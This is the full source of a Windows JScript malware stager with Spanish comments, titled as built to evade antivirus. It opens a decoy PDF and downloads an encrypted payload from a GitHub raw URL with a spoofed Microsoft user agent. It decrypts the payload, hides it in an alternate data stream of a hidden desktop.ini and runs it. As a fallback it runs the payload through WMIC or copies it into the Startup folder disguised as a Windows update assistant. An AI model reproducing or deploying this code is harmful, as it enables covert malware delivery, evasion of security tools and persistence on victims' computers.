// ========================================================================
// STAGER FINAL V3 - Con ADS para evadir AV
// ========================================================================

var PAYLOAD_URL = "https://raw.githubusercontent.com/ggggwrmsfootmen/curly-fortnight/refs/heads/main/health-check.enc";
var AES_KEY = "1234567890123456"; // 16 bytes
var AES_IV = "1234567890123456";  // 16 bytes

var fso = new ActiveXObject("Scripting.FileSystemObject");
var shell = new ActiveXObject("WScript.Shell");
var scriptDir = fso.GetParentFolderName(WScript.ScriptFullName);

// === CARGAR CRYPTOJS ===
WScript.Echo("[*] Cargando CryptoJS...");
try {
    var path1 = scriptDir + "\\cryptojs-aes.js";
    if (!fso.FileExists(path1)) {
        WScript.Echo("[!] No se encuentra: cryptojs-aes.js");
        WScript.Quit(1);
    }
    var file1 = fso.OpenTextFile(path1, 1);
    var code1 = file1.ReadAll();
    file1.Close();
    eval(code1);
    WScript.Echo("[+] CryptoJS AES cargado");
    
    var path2 = scriptDir + "\\cryptojs-mode-cfb.js";
    if (!fso.FileExists(path2)) {
        WScript.Echo("[!] No se encuentra: cryptojs-mode-cfb.js");
        WScript.Quit(1);
    }
    var file2 = fso.OpenTextFile(path2, 1);
    var code2 = file2.ReadAll();
    file2.Close();
    eval(code2);
    WScript.Echo("[+] Modo CFB cargado");
    
} catch(e) {
    WScript.Echo("[!] Error cargando CryptoJS: " + e.message);
    WScript.Quit(1);
}

// === FUNCIONES ===

function openPDF() {
    try {
        var folder = fso.GetFolder(scriptDir);
        var files = new Enumerator(folder.Files);
        
        for (; !files.atEnd(); files.moveNext()) {
            var file = files.item();
            if (file.Name.toLowerCase().indexOf(".pdf") > -1) {
                WScript.Echo("[+] Abriendo PDF: " + file.Name);
                shell.Run('"' + file.Path + '"', 1, false);
                return true;
            }
        }
    } catch(e) {}
    return false;
}

function downloadFile(url) {
    try {
        WScript.Echo("[*] Descargando payload...");
        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
        xhr.open("GET", url, false);
        xhr.setRequestHeader("User-Agent", "Microsoft-Delivery-Optimization/10.0");
        xhr.send();
        
        if (xhr.status == 200) {
            WScript.Echo("[+] Descargado: " + xhr.responseText.length + " bytes");
            return xhr.responseText;
        } else {
            WScript.Echo("[!] Error HTTP: " + xhr.status);
            return null;
        }
    } catch(e) {
        WScript.Echo("[!] Error descargando: " + e.message);
        return null;
    }
}

function decryptPayload(b64data, key, iv) {
    try {
        WScript.Echo("[*] Descifrando payload...");
        
        var rawResponse = b64data.replace(/[\r\n]+/g, "");
        var keyParsed = CryptoJS.enc.Utf8.parse(key);
        var ivParsed = CryptoJS.enc.Utf8.parse(iv);
        var encrypted = CryptoJS.enc.Base64.parse(rawResponse);
        
        var decrypted = CryptoJS.AES.decrypt({ciphertext: encrypted}, keyParsed, {
            iv: ivParsed,
            mode: CryptoJS.mode.CFB,
            padding: CryptoJS.pad.NoPadding || { pad: function(){}, unpad: function(){} }
        });
        
        var hex_full = decrypted.toString(CryptoJS.enc.Hex);
        var hex_dec = hex_full;
        
        if (hex_full && hex_full.length >= 16) {
            function readLE64FromHex(h) {
                var o = 0;
                for (var i = 0; i < 8; i++) {
                    var byteHex = h.substr(i * 2, 2);
                    var b = parseInt(byteHex, 16);
                    o |= (b << (8 * i)) >>> 0;
                }
                return o >>> 0;
            }
            
            var hex_needed = readLE64FromHex(hex_full);
            
            if (hex_needed && hex_needed * 2 <= hex_full.length - 16) {
                hex_dec = hex_full.substr(16, hex_needed * 2);
            }
        }
        
        WScript.Echo("[+] Descifrado: " + hex_dec.length + " caracteres hex");
        return hex_dec;
    } catch(e) {
        WScript.Echo("[!] Error descifrando: " + e.message);
        return null;
    }
}

function hexToADS(hexData, decoyFile, adsName) {
    try {
        WScript.Echo("[*] Guardando en ADS (" + hexData.length + " caracteres)...");
        
        var tempFolder = shell.ExpandEnvironmentStrings("%TEMP%");
        var hexFile = tempFolder + "\\hex_temp.txt";
        
        // Crear archivo señuelo si no existe
        if (!fso.FileExists(decoyFile)) {
            var df = fso.CreateTextFile(decoyFile, true);
            df.WriteLine("[.ShellClassInfo]");
            df.WriteLine("IconResource=shell32.dll,4");
            df.Close();
            shell.Run('attrib +H +S "' + decoyFile + '"', 0, true);
            WScript.Echo("[+] Señuelo creado: " + decoyFile);
        }
        
        // Guardar HEX temporal
        var hf = fso.CreateTextFile(hexFile, true);
        hf.Write(hexData);
        hf.Close();
        
        // VBS para escribir en ADS
        var vbsPath = tempFolder + "\\write_ads.vbs";
        var vbsCode = 'On Error Resume Next\n';
        vbsCode += 'Dim fso, hexStr, objStream, i\n';
        vbsCode += 'Set fso = CreateObject("Scripting.FileSystemObject")\n';
        vbsCode += 'Set hf = fso.OpenTextFile("' + hexFile + '", 1)\n';
        vbsCode += 'hexStr = hf.ReadAll()\n';
        vbsCode += 'hf.Close()\n';
        vbsCode += 'Set objStream = CreateObject("ADODB.Stream")\n';
        vbsCode += 'objStream.Type = 1\n';
        vbsCode += 'objStream.Open\n';
        vbsCode += 'For i = 1 To Len(hexStr) Step 2\n';
        vbsCode += '    objStream.Write Chr(CLng("&H" & Mid(hexStr, i, 2)))\n';
        vbsCode += 'Next\n';
        vbsCode += 'objStream.SaveToFile "' + decoyFile + ':' + adsName + '", 2\n';
        vbsCode += 'objStream.Close\n';
        vbsCode += 'If Err.Number <> 0 Then\n';
        vbsCode += '    WScript.Echo "VBS Error: " & Err.Description\n';
        vbsCode += 'End If\n';
        
        var vf = fso.CreateTextFile(vbsPath, true);
        vf.Write(vbsCode);
        vf.Close();
        
        WScript.Echo("[*] Escribiendo en ADS...");
        shell.Run("cscript //nologo //B " + vbsPath, 0, true);
        
        // Limpiar
        try { fso.DeleteFile(vbsPath); } catch(e) {}
        try { fso.DeleteFile(hexFile); } catch(e) {}
        
        WScript.Echo("[+] Payload almacenado en ADS");
        return true;
    } catch(e) {
        WScript.Echo("[!] Error guardando en ADS: " + e.message);
        return false;
    }
}

function executeFromADS(decoyFile, adsName) {
    try {
        WScript.Echo("[*] Ejecutando desde ADS...");
        
        // Ejecutar DIRECTAMENTE desde el ADS sin extraer
        var adsPath = decoyFile + ':' + adsName;
        
        WScript.Echo("[*] Ruta ADS: " + adsPath);
        
        // Método 1: Ejecutar directamente
        try {
            shell.Run('"' + adsPath + '"', 0, false);
            WScript.Echo("[+] Payload ejecutado desde ADS");
            return true;
        } catch(e1) {
            WScript.Echo("[!] Método 1 falló: " + e1.message);
            
            // Método 2: Usar WMIC con ADS
            try {
                var cmd = 'cmd /c wmic process call create "' + adsPath.replace(/\\/g, "\\\\") + '"';
                shell.Run(cmd, 0, true);
                WScript.Echo("[+] Payload ejecutado con WMIC");
                return true;
            } catch(e2) {
                WScript.Echo("[!] Método 2 falló: " + e2.message);
                
                // Método 3: Copiar a ubicación alternativa
                try {
                    var altPath = shell.ExpandEnvironmentStrings("%APPDATA%") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdateAssistant.exe";
                    
                    var vbsPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\extract_ads.vbs";
                    var vbsCode = 'On Error Resume Next\n';
                    vbsCode += 'Dim objStream\n';
                    vbsCode += 'Set objStream = CreateObject("ADODB.Stream")\n';
                    vbsCode += 'objStream.Type = 1\n';
                    vbsCode += 'objStream.Open\n';
                    vbsCode += 'objStream.LoadFromFile "' + adsPath + '"\n';
                    vbsCode += 'objStream.SaveToFile "' + altPath + '", 2\n';
                    vbsCode += 'objStream.Close\n';
                    
                    var vf = fso.CreateTextFile(vbsPath, true);
                    vf.Write(vbsCode);
                    vf.Close();
                    
                    shell.Run("cscript //nologo //B " + vbsPath, 0, true);
                    try { fso.DeleteFile(vbsPath); } catch(e) {}
                    
                    if (fso.FileExists(altPath)) {
                        WScript.Echo("[+] Extraído a ubicación alternativa");
                        shell.Run('"' + altPath + '"', 0, false);
                        WScript.Echo("[+] Payload ejecutado");
                        return true;
                    }
                } catch(e3) {
                    WScript.Echo("[!] Método 3 falló: " + e3.message);
                }
            }
        }
        
        WScript.Echo("[!] Todos los métodos fallaron");
        return false;
    } catch(e) {
        WScript.Echo("[!] Error ejecutando: " + e.message);
        return false;
    }
}

// === FLUJO PRINCIPAL ===

WScript.Echo("========================================");
WScript.Echo("STAGER ADS - Iniciando...");
WScript.Echo("========================================\n");

try {
    openPDF();
    WScript.Sleep(1000);
    
    var encryptedData = downloadFile(PAYLOAD_URL);
    if (!encryptedData) WScript.Quit(1);
    
    var hexData = decryptPayload(encryptedData, AES_KEY, AES_IV);
    if (!hexData) WScript.Quit(1);
    
    // Usar ADS en archivo señuelo
    var decoyFile = shell.ExpandEnvironmentStrings("%TEMP%") + "\\desktop.ini";
    var adsName = "data";
    
    if (!hexToADS(hexData, decoyFile, adsName)) WScript.Quit(1);
    
    // Ejecutar directamente desde ADS
    if (!executeFromADS(decoyFile, adsName)) WScript.Quit(1);
    
    WScript.Sleep(1000);
    // Comentar para testing
    // try { fso.DeleteFile(WScript.ScriptFullName); } catch(e) {}
    
    WScript.Echo("\n[+] COMPLETADO");
    
} catch(e) {
    WScript.Echo("[!] ERROR: " + e.message);
    WScript.Quit(1);
}

WScript.Echo("\nPresiona ENTER...");
WScript.StdIn.ReadLine();
